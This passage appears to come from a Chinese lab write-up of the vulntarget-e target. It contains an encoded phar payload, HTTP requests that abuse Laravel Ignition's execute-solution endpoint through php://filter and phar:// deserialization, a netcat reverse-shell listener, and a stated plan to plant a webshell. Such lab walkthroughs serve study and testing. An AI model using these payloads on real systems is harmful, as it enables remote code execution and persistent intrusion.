class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=53</span>=<span class="number">00=57=00=78</span>=<span class="number">00=73=00=64</span>=<span class="number">00=57=00=31</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=56=00=78</span>=<span class="number">00=43=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=39=00=68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=68=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=64=00=63</span>=<span class="number">00=55=00=47</span>=<span class="number">00=56=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=48</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=58=00=45</span>=<span class="number">00=52=00=70</span>=<span class="number">00=63=00=33</span>=<span class="number">00=42=00=68</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=59</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=46</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=56</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=78=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=54</span>=<span class="number">00=47=00=39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=56</span>=<span class="number">00=32=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00=31=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=73=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=51=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=57=00=52</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=59=00=58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=45</span>=<span class="number">00=56=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=35=00=58</span>=<span class="number">00=45=00=64</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=59=00=58</span>=<span class="number">00=52=00=76</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=72=00=52</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=35=00=70</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=76=00=62</span>=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=63=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=52</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=39</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=31</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=74</span>=<span class="number">00=44=00=62</span>=<span class="number">00=32=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=64=00=31</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00=61=00=57</span>=<span class="number">00=39=00=75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00=35=00=68</span>=<span class="number">00=62=00=57</span>=<span class="number">00=55=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=79=00=49</span>=<span class="number">00=37=00=66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=67</span>=<span class="number">00=36=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=63=00=47</span>=<span class="number">00=68=00=77</span>=<span class="number">00=49=00=48</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=53</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=30=00=67</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=33=00=52</span>=<span class="number">00=74=00=63</span>=<span class="number">00=43=00=39</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=31</span>=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=62=00=79</span>=<span class="number">00=41=00=76</span>=<span class="number">00=64=00=47</span>=<span class="number">00=31=00=77</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=32=00=59</span>=<span class="number">00=37=00=59</span>=<span class="number">00=32=00=46</span>=<span class="number">00=30=00=49</span>=<span class="number">00=43=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=77=00=76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=49=00=43</span>=<span class="number">00=31=00=70</span>=<span class="number">00=49=00=44</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=46=00=38</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=32</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=43=00=34</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=44=00=51</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=49</span>=<span class="number">00=34=00=49</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=67=00=50</span>=<span class="number">00=69=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=69=00=63</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=42</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=63=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=54=00=73</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=68</span>=<span class="number">00=70=00=64</span>=<span class="number">00=44=00=73</span>=<span class="number">00=67=00=50</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=34=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=66</span>=<span class="number">00=51=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=52=00=34</span>=<span class="number">00=64=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=55</span>=<span class="number">00=33=00=59</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=42=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=66=00=39</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00=51=00=58</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=69=00=57</span>=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=76</span>=<span class="number">00=55=00=64</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=41=00=44</span>=<span class="number">00=44=00=62</span>=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=69=00=43</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=74=00=77</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=48</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=43</span>=<span class="number">00</span>a&quot;</span></span><br><span class="line"><span class="dns">  &#125;</span></span><br><span class="line"><span class="dns">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201330580.png" alt="image-20221129201330580"></p><p>发送如下数据包，清空对log文件中的干扰字符，只留下POC：返回200</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>299</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201505852.png" alt="image-20221129201505852"></p><p>使用phar://进行反序列化，执行任意代码（有的文章说相对路径，有的绝对路径，这里笔者觉得还是相对路径好用，绝对路径没出，如果想用绝对路径，上面500报错哪里有路径，我们这里使用相对吧）：这里要先nc监听一下<br><code>nc -lvnp 9999</code>shell就过来了，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>204</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201932533.png" alt="image-20221129201932533"></p><p>这里我们就拿到shell了，但是传文件可能不太好用，要反向下载，我们这里到web跟路径写个🐎后面方便传文件下载啥的。需要注意，这个执行就只能执行一次，上面已经说过了，日志文件会被覆盖，所以如果没打成功就要重新来一遍，而且第一次清空日志的时候一定要返回200才算清空成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/public</span><br><span class="line"><span 